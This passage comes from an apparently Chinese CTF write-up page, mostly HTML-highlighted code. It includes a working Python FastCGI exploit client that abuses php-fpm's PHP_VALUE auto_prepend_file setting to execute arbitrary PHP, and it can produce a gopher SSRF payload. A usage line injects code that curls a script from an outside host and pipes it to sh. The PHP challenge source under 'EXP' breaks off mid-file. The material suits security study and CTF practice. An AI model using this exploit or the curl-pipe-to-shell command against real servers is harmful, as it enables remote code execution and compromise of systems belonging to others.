class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    <span class="keyword">print</span> response</span><br><span class="line">    <span class="comment"># print("gopher://127.0.0.1:" + str(args.port) + "/_" + response)</span></span><br></pre></td></tr></table></figure></p><p>ä½¿ç”¨æ–¹å¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fastcgi.py 127.0.0.1 /var/www/html/index.php -c &quot;&lt;?php system(&apos;curl http://ebcece08.w1n.pw/getflag | sh&apos;);die(&apos;zeroyu&apos;);?&gt;&quot;</span><br></pre></td></tr></table></figure></p><h4 id="5-EXP"><a href="#5-EXP" class="headerlink" title="5. EXP"></a>5. EXP</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$disable_functions = ini_get(<span class="string">"disable_functions"</span>);</span><br><span class="line">$loadext = get_loaded_extensions();</span><br><span class="line"><span class="keyword">foreach</span> ($loadext <span class="keyword">as</span> $ext) &#123;</span><br><span class="line"><span class="keyword">if</span> (in_array($ext, <span class="keyword">array</span>(<span class="string">"Core"</span>, <span class="string">"date"</span>, <span class="string">"libxml"</span>, <span class="string">"pcre"</span>, <span class="string">"zlib"</span>, <span class="string">"filter"</span>, <span class="string">"hash"</span>, <span class="string">"sqlite3"</span>, <span class="string">"zip"</span>))) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (count(get_extension_funcs($ext) ? get_extension_funcs($ext) : <span class="keyword">array</span>()) &gt;= <span class="number">1</span>) &#123;</span><br><span class="line">$dfunc = join(<span class="string">','</span>, get_extension_funcs($ext));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">$disable_functions = $disable_functions . $dfunc . <span class="string">","</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$func = get_defined_functions()[<span class="string">"internal"</span>];</span><br><span class="line"></span><br><span class="line">$seed = time();</span><br><span class="line">srand($seed);</span><br><span class="line">define(<span class="string">'INS_OFFSET'</span>, rand(<span class="number">0x0</span>, <span class="number">0xffff</span>));</span><br><span class="line">$regs = <span class="keyword">array</span>(<span class="string">'eax'</span> =&gt; <span class="number">0x0</span>, <span class="string">'ebp'</span> =&gt; <span class="number">0x0</span>, <span class="string">'esp'</span> =&gt; <span class="number">0x0</span>, <span class="string">'eip'</span> =&gt; <span class="number">0x0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aslr</span><span class="params">(&amp;$a, $O0O)</span> </span>&#123;</span><br><span class="line">$a = $a + <span class="number">0x60000000</span> + INS_OFFSET + <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ„é€ å‡½æ•°åœ°å€</span></span><br><span class="line">$func_ = array_flip($func);</span><br><span class="line">array_walk($func_, <span class="string">'aslr'</span>);</span><br><span class="line">$plt = array_flip($func_);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handle_data</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">$len = strlen($data);</span><br><span class="line">$a = $len / <span class="number">0x4</span> + <span class="number">0x1</span> * ($len % <span class="number">0x4</span>);</span><br><span class="line">$ret = str_split($data, <span class="number">0x4</span>);</span><br><span class="line">$ret[$a - <span class="number">0x1</span>] = str_pad($ret[$a - <span class="number">0x1</span>], <span class="number">0x4</span>, <span class="string">"\x00"</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($ret <span class="keyword">as</span> $key =&gt; &amp;$value) &#123;</span><br><span class="line">$value = strrev(bin2hex($value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gen_canary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$canary = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789'</span>;</span><br><span class="line">$a = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">$b = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">$c = $canary[rand(<span class="number">0</span>, strlen($canary) - <span class="number">0x1</span>)];</span><br><span class="line">$d = <span class="string">"\x00"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> handle_data($a . $b . $c . $d)[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$canary = gen_canary();</span><br><span class="line">$canarycheck = $canary;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_canary</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $canary;</span><br><span class="line"><span class="keyword">global</span> $canarycheck;</span><br><span class="line"><span class="keyword">if</span> ($canary != $canarycheck) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'emmmmmm...Don\'t attack me!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">stack</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $ebp, $stack, $esp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($a, $b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line"><span class="keyword">$this</span>-&gt;ebp = &amp;$regs[<span class="string">'ebp'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp = &amp;$regs[<span class="string">'esp'</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;ebp = <span class="number">0xfffe0000</span> + rand(<span class="number">0x0</span>, <span class="number">0xffff</span>);</span><br><span class="line"><span class="keyword">global</span> $canary;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp - <span class="number">0x4</span>] = &amp;$canary;</span><br><span class="line"><span class="keyword">$this</span>-&gt;canary = $canary;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp] = <span class="keyword">$this</span>-&gt;ebp + rand(<span class="number">0x0</span>, <span class="number">0xffff</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp = <span class="keyword">$this</span>-&gt;ebp - rand(<span class="number">0x20</span>, <span class="number">0x60</span>) * <span class="number">0x4</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;ebp + <span class="number">0x4</span>] = dechex($a);</span><br><span class="line"><span class="keyword">if</span> ($b != <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pushdata($b);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pushdata</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">$data_bak = $data;</span><br><span class="line">$data = handle_data($data);</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; count($data); $i++) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp + $i * <span class="number">0x4</span>] = $data[$i];</span><br><span class="line"><span class="comment">//no args in my stack haha</span></span><br><span class="line">check_canary();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">recover_data</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> hex2bin(strrev($data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">outputdata</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'root says: '</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">0x1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;esp == <span class="keyword">$this</span>-&gt;ebp - <span class="number">0x4</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">$data = <span class="keyword">$this</span>-&gt;recover_data($regs[<span class="string">'eax'</span>]);</span><br><span class="line">$ret = explode(<span class="string">"\x00"</span>, $data);</span><br><span class="line"><span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (count($ret) &gt; <span class="number">0x1</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ret</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp = <span class="keyword">$this</span>-&gt;ebp;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'ebp'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eip'</span>);</span><br><span class="line"><span class="keyword">$this</span>-&gt;call();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_data_from_reg</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line">$a = <span class="keyword">$this</span>-&gt;recover_data($regs[$item]);</span><br><span class="line">$b = explode(<span class="string">"\x00"</span>, $a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $b[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line"><span class="keyword">global</span> $plt;</span><br><span class="line">$a = hexdec($regs[<span class="string">'eip'</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[$a])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">$len = (int) <span class="keyword">$this</span>-&gt;get_data_from_reg(<span class="string">'eax'</span>);</span><br><span class="line">$args = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;pop(<span class="string">'eax'</span>);</span><br><span class="line">$data = <span class="keyword">$this</span>-&gt;get_data_from_reg(<span class="string">'eax'</span>);</span><br><span class="line">array_push($args, $_REQUEST[$data]);</span><br><span class="line">&#125;</span><br><span class="line">call_user_func_array($plt[$a], $args);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">call_user_func($plt[$a]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">push</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line">$data = $regs[$item];</span><br><span class="line"><span class="keyword">if</span> (hex2bin(strrev($data)) == <span class="keyword">null</span>) &#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'data error'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp] = $data;</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp -= <span class="number">0x4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pop</span><span class="params">($item)</span> </span>&#123;</span><br><span class="line"><span class="keyword">global</span> $regs;</span><br><span class="line">$regs[$item] = <span class="keyword">$this</span>-&gt;stack[<span class="keyword">$this</span>-&gt;esp];</span><br><span class="line"><span class="keyword">$this</span>-&gt;esp += <span class="number">0x4</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $args)</span> </span>&#123;</span><br><span class="line">check_canary();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span 